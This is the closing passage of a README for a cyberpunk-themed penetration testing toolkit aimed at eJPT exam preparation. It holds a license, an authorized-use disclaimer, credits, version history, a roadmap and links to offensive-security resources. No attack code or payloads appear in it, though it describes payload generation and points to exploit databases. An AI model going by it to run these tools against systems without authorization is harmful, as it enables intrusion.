furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## Disclaimer
### Legal Notice
**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.**  
By using this toolkit, you agree to:
1. **Only test systems you own or have explicit written permission to test**
2. **Comply with all applicable local, state, national, and international laws**
3. **Not use this tool for malicious purposes**
4. **Accept full responsibility for your actions**

### Important Warnings
- Unauthorized access to computer systems is illegal in most jurisdictions
- Unauthorized penetration testing can result in:
  - Criminal prosecution
  - Civil liability
  - Termination of employment
  - Revocation of certifications
  - Financial penalties

### No Warranty
This software is provided "as is" without warranty of any kind, express or implied. The authors and contributors:
- Make no guarantees about the accuracy or reliability of results
- Are not responsible for any damage caused by use or misuse
- Do not guarantee this tool will help you pass the eJPT exam
- Are not affiliated with eLearnSecurity or INE

### Ethical Use
This tool is designed to support ethical hacking and authorized security assessments. Always:
- Obtain proper authorization before testing
- Respect scope limitations
- Report findings responsibly
- Follow your organization's policies
- Adhere to professional codes of conduct

---

## Credits
### Development
- **Primary Developer**: [Your Name]
- **Contributors**: [List contributors]

### Acknowledgments
- **eLearnSecurity/INE**: For the eJPT certification program
- **Offensive Security**: For inspiration and methodology
- **OWASP**: For security testing frameworks and resources
- **The cybersecurity community**: For tools, techniques, and knowledge sharing

### Tools and Libraries
This toolkit integrates or references:
- **Nmap**: Network scanning (Gordon Lyon)
- **Gobuster**: Directory brute-forcing (OJ Reeves)
- **Nikto**: Web server scanning (CIRT.net)
- **Python**: Programming language
- **Requests**: HTTP library
- **Colorama**: Terminal colors

### Inspiration
Cyberpunk theme inspired by:
- Cyberpunk 2077 (CD Projekt Red)
- The Matrix franchise
- Blade Runner aesthetic
- Hacker culture and terminal interfaces

---

## Version History
### v2.0.0 (2024-01-15)
- Complete cyberpunk theme implementation
- Modular architecture redesign
- Enhanced payload generation
- Improved report templates
- Comprehensive documentation
- Bug fixes and performance improvements

### v1.0.0 (2024-01-01)
- Initial release
- Basic scanning functionality
- Simple payload generation
- Report template creation

---

## Support and Contact
### Getting Support
- **Documentation**: Read this README thoroughly
- **Issues**: Check the Troubleshooting section
- **Community**: Join cybersecurity Discord servers and forums

### Contact
- **GitHub**: [repository link]
- **Email**: [your email]
- **Twitter**: [@yourhandle]

---

## Roadmap
### Planned Features
- [ ] PDF report generation
- [ ] HTML report export
- [ ] Interactive web dashboard
- [ ] Database integration for multi-engagement tracking
- [ ] Enhanced automation for common exploitation paths
- [ ] Integration with Metasploit Framework
- [ ] Mobile application penetration testing modules
- [ ] Cloud security assessment capabilities
- [ ] API security testing features
- [ ] Machine learning-based attack recommendations

### Long-term Vision
Transform NETRUNNER into a comprehensive security assessment platform suitable for:
- eJPT certification preparation
- OSCP-level assessments
- Bug bounty hunting
- Professional penetration testing engagements
- Red team operations
- Security research

---

## Additional Resources
### eJPT Preparation
- **Official Course**: INE eJPT course
- **Practice Labs**: HackTheBox, TryHackMe, PentesterLab
- **Books**:
  - "The Web Application Hacker's Handbook"
  - "Penetration Testing" by Georgia Weidman
  - "Network Security Assessment" by Chris McNab

### Penetration Testing Methodologies
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **PTES**: http://www.pentest-standard.org/
- **NIST SP 800-115**: https://csrc.nist.gov/publications/detail/sp/800-115/final

### Online Communities
- **Reddit**: r/AskNetsec, r/netsec, r/cybersecurity
- **Discord**: Many cybersecurity Discord servers
- **Twitter**: Follow #infosec, #pentesting, #bugbounty

### Useful Websites
- **GTFOBins**: Privilege escalation techniques
- **PayloadsAllTheThings**: Comprehensive payload repository
- **HackTricks**: Pentesting wiki
- **Exploit-DB**: Public exploit database

---

**Stay sharp, netrunner. Welcome to the future of security assessment.**

```
[NEURAL LINK TERMINATED]
[SYSTEM OFFLINE]
```
